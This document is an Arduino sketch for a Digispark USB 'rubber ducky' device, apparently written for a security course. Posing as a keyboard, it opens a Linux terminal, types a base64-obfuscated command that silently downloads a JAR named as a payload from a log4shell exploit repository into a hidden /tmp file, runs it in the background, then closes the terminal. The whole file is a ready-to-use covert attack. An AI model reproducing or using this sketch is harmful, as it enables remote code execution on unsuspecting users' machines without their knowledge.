#define LED_BUILTIN 1
#include "DigiKeyboard.h"
/**
 *
 * @author      Muhammad Nur Irsyad
 * @id          1807422020
 * @class       CCIT SEC 8 (TMJ)
 */
bool passed = false;
//----------
void setup() {
    pinMode(LED_BUILTIN, OUTPUT);    
    digitalWrite(LED_BUILTIN, HIGH);
    //----------
    DigiKeyboard.sendKeyStroke(0); delay(500);     
    DigiKeyboard.sendKeyStroke(KEY_T , MOD_CONTROL_LEFT | MOD_ALT_LEFT); delay(3250);  
    DigiKeyboard.println(" base64 -d <<< IyEvYmluL2Jhc2gKIy0tLS0tLS0tLS0Kd2dldCAtcSAtTyAvdG1wLy5wYXlsb2FkLTYuMjIuamFyIGh0dHBzOi8vZ2l0aHViLmNvbS9ob3Rwb3Rjb29raWUvbG9nNHNoZWxsLXdoaXRlLWJveC9yYXcvbWFpbi9yZWQvbXZuLXdlYi1leHBsb2l0L3RhcmdldC9wYXlsb2FkLTYuMjIuamFyICYgd2FpdApqYXZhIC1qYXIgL3RtcC8ucGF5bG9hZC02LjIyLmphcg== | sh & disown"); delay(750);
    DigiKeyboard.sendKeyStroke(KEY_W , MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);      
    //----------
    passed = true;
}

void loop() {
    if (passed) {
        digitalWrite(LED_BUILTIN, LOW); delay(100);            
        digitalWrite(LED_BUILTIN, HIGH); delay(125);                                              
     }
}
